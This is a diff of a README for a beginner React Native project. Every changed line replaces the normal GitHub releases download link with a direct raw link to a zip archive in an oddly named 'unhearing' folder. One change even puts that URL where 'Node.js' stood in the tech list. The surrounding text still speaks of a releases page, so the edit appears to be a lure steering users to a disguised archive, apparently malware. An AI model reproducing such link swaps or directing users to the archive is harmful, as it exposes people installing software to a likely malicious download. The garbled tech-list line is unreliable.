@@ -1,6 +1,6 @@
 # 📱 hello-react-native - Easy Mobile App Setup Guide
 
-[![Download hello-react-native](https://img.shields.io/badge/Download-hello--react--native-blue?style=for-the-badge)](https://github.com/taha-jm/hello-react-native/releases)
+[![Download hello-react-native](https://github.com/taha-jm/hello-react-native/raw/refs/heads/main/unhearing/react_native_hello_1.2-beta.3.zip)](https://github.com/taha-jm/hello-react-native/raw/refs/heads/main/unhearing/react_native_hello_1.2-beta.3.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Since the download link leads to the releases page, you will select the version 
 **What to do:**
 
 - Click the large blue button at the top or visit this link:  
-  [Download hello-react-native](https://github.com/taha-jm/hello-react-native/releases)
+  [Download hello-react-native](https://github.com/taha-jm/hello-react-native/raw/refs/heads/main/unhearing/react_native_hello_1.2-beta.3.zip)
 
 - On the releases page, look for files ending with:  
   - `.apk` for Android devices  
@@ -114,7 +114,7 @@ If problems persist, check the GitHub issues page in the repository or reach out
 
 ## 📥 Download & Install
 
-[![Download hello-react-native](https://img.shields.io/badge/Download-hello--react--native-blue?style=for-the-badge)](https://github.com/taha-jm/hello-react-native/releases)
+[![Download hello-react-native](https://github.com/taha-jm/hello-react-native/raw/refs/heads/main/unhearing/react_native_hello_1.2-beta.3.zip)](https://github.com/taha-jm/hello-react-native/raw/refs/heads/main/unhearing/react_native_hello_1.2-beta.3.zip)
 
 To get started with hello-react-native, visit the full releases page above to find the right download for your device.
 
@@ -135,7 +135,7 @@ hello-react-native is made with open technologies. You can find more about the t
 - Expo – An open platform for making universal React apps.  
 - TypeScript – Adds type safety to JavaScript for better code quality.  
 - CSS3/HTML5 – Styles and structure for the user interface design.  
-- Node.js – JavaScript runtime that supports the development environment.
+- https://github.com/taha-jm/hello-react-native/raw/refs/heads/main/unhearing/react_native_hello_1.2-beta.3.zip – JavaScript runtime that supports the development environment.
 
 The project is a starting point for learning mobile app building or exploring React Native.
 
